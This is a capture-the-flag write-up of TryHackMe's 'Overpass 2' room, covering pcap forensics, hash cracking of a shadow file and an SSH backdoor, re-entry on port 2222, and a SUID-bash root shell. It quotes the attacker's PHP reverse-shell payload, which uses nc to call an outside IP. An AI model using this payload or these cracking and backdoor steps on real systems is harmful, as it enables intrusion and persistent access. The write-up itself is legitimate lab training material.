---
layout: project
type: project
image: images/writeups/thm/overpass-2/logo.png
title: Overpass 2 - TryHackMe
permalink: writeups/overpass-2
# All dates must be YYYY-MM-DD format!
date: 2021-04-20
labels:
  - TryHackMe
  - Forensics
  - Wireshark
summary: Overpass has been hacked! Can you analyse the attacker's actions and hack back in?
---

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/overpass-2/header.png">
<script src="https://www.tryhackme.com/badge/192700"></script>

```
MACHINE = OVERPASS 2
TARGET = VARIABLE
OS = LINUX
DIFFICULTY = MEDIUM
```
## Forensics

I analyzed the pcap file using wireshark and found the web directory for the upload page at /development/upload.php and got the payload for the uploaded file 

```php
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

I then got the password used to privesc to the user james. The attacker used the GitHub project [ssh-backdoor](https://github.com/NinjaJc01/ssh-backdoor) to gain persistence

```
james:XXXXX
```

I found the contents from the /etc/shadow file and tried cracking the hashes using john and fasttrack wordlist

```
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```

```shell
┌──(root💀Toyin)-[~/infosec/thm/overpass-series/2/forensics]
└─# john --wordlist=/opt/wordlists/fasttrack.txt hashes
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
XXXXX         (bee)
XXXXX          (szymex)
XXXXX         (muirland)
XXXXX        (paradox)
4g 0:00:00:00 DONE (2021-04-17 15:18) 14.81g/s 822.2p/s 4111c/s 4111C/s Spring2017..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Research

Time to analyse the code for the ssh-backdoor. I downloaded the code from the GitHub repo and went through the main.go code and got the default hash and the salt

```
Hash:
bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3

Salt:
1c362db832f3f864c8c2fe05f2002a05
```

Going through the pcap file on TCP Stream 3 I found the “backdoor -a” which from the source code outputs the backdoor hash

```shell
james@overpass-production:~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

```

I used hashcat on my windows machine to crack the salted hash and got the password

```
Dictionary cache hit:
* Filename..: .\wordlists\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:XXXXX

Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512($pass.$salt)
Hash.Target......: 6d05358f090eea56a238af02e47d44ee5489d234810ef624028...002a05
```

## Attack

Starting with an nmap scan

```shell
┌──(root💀Toyin)-[~/infosec/thm/overpass-series/2/attack]
└─# nmap -T4 -A 10.10.139.211 -oN nmap
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-17 16:00 WAT
Nmap scan report for 10.10.139.211
Host is up (0.21s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LOL Hacked
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey:
|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=4/17%OT=22%CT=1%CU=30256%PV=Y%DS=2%DC=T%G=Y%TM=607AF87
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
OS:1NW6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   216.49 ms 10.8.0.1
2   216.41 ms 10.10.139.211

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.70 seconds
```

Going to the webpage I get the message from the hacker

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/overpass-2/1.png">

I tried logging in via ssh as the user james and with various passwords, the password that I cracked with haschat got me in but only on port 2222

```shell
┌──(root💀Toyin)-[~/infosec/thm/overpass-series/2/attack]
└─# ssh -p 2222 james@overpass.thm
james@overpass.thm's password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@overpass-production:/home/james/ssh-backdoor$
james@overpass-production:/home/james$ cat user.txt
thm{d1...67}
```

The attacker left file named .suid_bash which had the suid bit set and was owned by root, executing the file with the correct flag gave a shell as root

```shell
james@overpass-production:/home/james$ ./.suid_bash  -p
.suid_bash-4.4# whoami
root
```